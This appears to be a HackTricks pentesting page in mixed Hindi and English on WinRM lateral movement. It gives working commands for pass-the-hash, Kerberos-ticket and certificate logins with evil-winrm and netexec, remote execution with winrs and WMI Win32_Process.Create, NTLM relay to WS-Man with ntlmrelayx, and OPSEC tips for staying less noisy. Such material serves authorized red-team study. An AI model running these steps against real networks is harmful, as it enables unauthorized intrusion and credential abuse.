# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM Windows environments में सबसे सुविधाजनक **lateral movement** transports में से एक है, क्योंकि यह आपको **WS-Man/HTTP(S)** पर remote shell देता है, बिना SMB service creation tricks की जरूरत के। अगर target **5985/5986** expose करता है और आपका principal remoting use करने की अनुमति रखता है, तो आप अक्सर "valid creds" से "interactive shell" तक बहुत जल्दी पहुंच सकते हैं।

**protocol/service enumeration**, listeners, WinRM को enable करना, `Invoke-Command`, और generic client usage के लिए, देखें:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- **HTTP/HTTPS** का use करता है, SMB/RPC की बजाय, इसलिए यह अक्सर वहां काम कर जाता है जहां PsExec-style execution blocked होती है।
- **Kerberos** के साथ, यह reusable credentials को target तक भेजने से बचता है।
- **Windows**, **Linux**, और **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`) से साफ़ तरीके से काम करता है।
- Interactive PowerShell remoting path target पर authenticated user context में **`wsmprovhost.exe`** spawn करता है, जो service-based exec से operationally अलग है।

## Access model and prerequisites

व्यावहारिक रूप से, सफल WinRM lateral movement इन **तीन** चीज़ों पर निर्भर करता है:

1. Target पर **WinRM listener** (`5985`/`5986`) और access की अनुमति देने वाले firewall rules हों।
2. Account endpoint पर **authenticate** कर सके।
3. Account को remoting session **open** करने की अनुमति हो।

यह access पाने के सामान्य तरीके:

- Target पर **Local Administrator** होना।
- नए systems पर **Remote Management Users** membership, या उन systems/components पर **WinRMRemoteWMIUsers__** जो अभी भी उस group को मानते हैं।
- Local security descriptors / PowerShell remoting ACL changes के जरिए explicitly delegated remoting rights।

अगर आप पहले से admin rights वाले box को control करते हैं, तो याद रखें कि आप यहां बताई गई techniques का उपयोग करके full admin group membership के बिना भी **WinRM access delegate** कर सकते हैं:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos को hostname/FQDN चाहिए**। अगर आप IP से connect करते हैं, client आमतौर पर **NTLM/Negotiate** पर fallback करता है।
- **workgroup** या cross-trust edge cases में, NTLM को आमतौर पर या तो **HTTPS** चाहिए या client पर target को **TrustedHosts** में add करना पड़ता है।
- Workgroup में **local accounts** के साथ Negotiate over उपयोग करते समय, UAC remote restrictions access रोक सकती हैं, जब तक built-in Administrator account इस्तेमाल न किया जाए या `LocalAccountTokenFilterPolicy=1` न हो।
- PowerShell remoting default रूप से **`HTTP/<host>` SPN** का use करता है। जिन environments में **`HTTP/<host>`** पहले से किसी और service account के लिए registered है, वहां WinRM Kerberos `0x80090322` के साथ fail हो सकता है; port-qualified SPN use करें या जहां यह SPN मौजूद हो वहां **`WSMAN/<host>`** पर switch करें।

अगर password spraying के दौरान आपको valid credentials मिलते हैं, तो उन्हें WinRM के जरिए validate करना अक्सर यह जांचने का सबसे तेज़ तरीका होता है कि वे shell में बदलते हैं या नहीं:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### इंटरैक्टिव shells के लिए Evil-WinRM

`evil-winrm` Linux से सबसे सुविधाजनक interactive विकल्प बना रहता है क्योंकि यह **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, file transfer, और in-memory PowerShell/.NET loading को support करता है.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

जब default **`HTTP/<host>`** SPN Kerberos failures का कारण बनता है, तो इसके बजाय **`WSMAN/<host>`** ticket request/use करने की कोशिश करें। यह hardened या odd enterprise setups में दिखाई देता है, जहाँ `HTTP/<host>` पहले से ही किसी दूसरे service account से attached होता है।
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
यह भी **RBCD / S4U** abuse के बाद उपयोगी है जब आपने विशेष रूप से एक सामान्य `HTTP` ticket के बजाय एक **WSMAN** service ticket forged या requested किया हो।

### Certificate-based authentication

WinRM **client certificate authentication** को भी support करता है, लेकिन certificate को target पर एक **local account** के साथ mapped होना चाहिए। Offensive perspective से यह तब महत्वपूर्ण होता है जब:

- आपने पहले से एक valid client certificate और private key चुराया/export किया हो जो WinRM के लिए पहले से mapped है;
- आपने **AD CS / Pass-the-Certificate** का abuse करके किसी principal के लिए certificate प्राप्त किया हो और फिर किसी दूसरे authentication path में pivot किया हो;
- आप ऐसे environments में operate कर रहे हों जो जानबूझकर password-based remoting से बचते हैं।
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM password/hash/Kerberos auth की तुलना में बहुत कम common है, लेकिन जब यह मौजूद होता है, तो यह एक **passwordless lateral movement** path दे सकता है जो password rotation के बाद भी बना रहता है।

### Python / automation with `pypsrp`

अगर आपको operator shell की बजाय automation चाहिए, तो `pypsrp` Python से WinRM/PSRP देता है, जिसमें **NTLM**, **certificate auth**, **Kerberos**, और **CredSSP** support शामिल है।
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` बिल्ट-इन है और तब उपयोगी है जब आप **native WinRM command execution** चाहते हैं, बिना interactive PowerShell remoting session खोले:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
ऑपरेशनल रूप से, `winrs.exe` आमतौर पर एक रिमोट प्रोसेस चेन के समान परिणाम देता है:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
यह याद रखने लायक है क्योंकि यह service-based exec और interactive PSRP sessions से अलग है।

### `winrm.cmd` / PowerShell remoting के बजाय WS-Man COM

आप **WinRM transport** के माध्यम से भी `Enter-PSSession` के बिना execute कर सकते हैं, WS-Man पर WMI classes invoke करके। इससे transport WinRM ही रहता है, लेकिन remote execution primitive **WMI `Win32_Process.Create`** बन जाता है:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
यह तरीका उपयोगी है जब:

- PowerShell logging पर बहुत कड़ी निगरानी होती है।
- आप **WinRM transport** चाहते हैं लेकिन classic PS remoting workflow नहीं।
- आप **`WSMan.Automation`** COM object के आसपास custom tooling बना रहे हैं या उपयोग कर रहे हैं।

## NTLM relay to WinRM (WS-Man)

जब SMB relay signing से blocked हो जाता है और LDAP relay constrained होता है, तब **WS-Man/WinRM** अभी भी एक आकर्षक relay target हो सकता है। Modern `ntlmrelayx.py` में **WinRM relay servers** शामिल हैं और यह **`wsman://`** या **`winrms://`** targets पर relay कर सकता है।
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
दो व्यावहारिक नोट्स:

- Relay तब सबसे उपयोगी होता है जब target **NTLM** स्वीकार करता हो और relayed principal को WinRM इस्तेमाल करने की अनुमति हो।
- हाल के Impacket code में खास तौर पर **`WSMANIDENTIFY: unauthenticated`** requests को handle किया जाता है, ताकि `Test-WSMan`-style probes relay flow को न तोड़ें।

पहला WinRM session मिलने के बाद multi-hop constraints के लिए, देखें:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC and detection notes

- **Interactive PowerShell remoting** आमतौर पर target पर **`wsmprovhost.exe`** बनाता है।
- **`winrs.exe`** आमतौर पर **`winrshost.exe`** बनाता है और फिर requested child process।
- अगर आप raw `cmd.exe` के बजाय PSRP इस्तेमाल करते हैं, तो **network logon** telemetry, WinRM service events, और PowerShell operational/script-block logging की उम्मीद रखें।
- अगर आपको सिर्फ एक command चाहिए, तो `winrs.exe` या one-shot WinRM execution लंबे-lived interactive remoting session की तुलना में कम noisy हो सकता है।
- अगर Kerberos उपलब्ध है, तो IP + NTLM की बजाय **FQDN + Kerberos** को प्राथमिकता दें, ताकि trust issues और client-side `TrustedHosts` बदलाव दोनों कम हों।

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
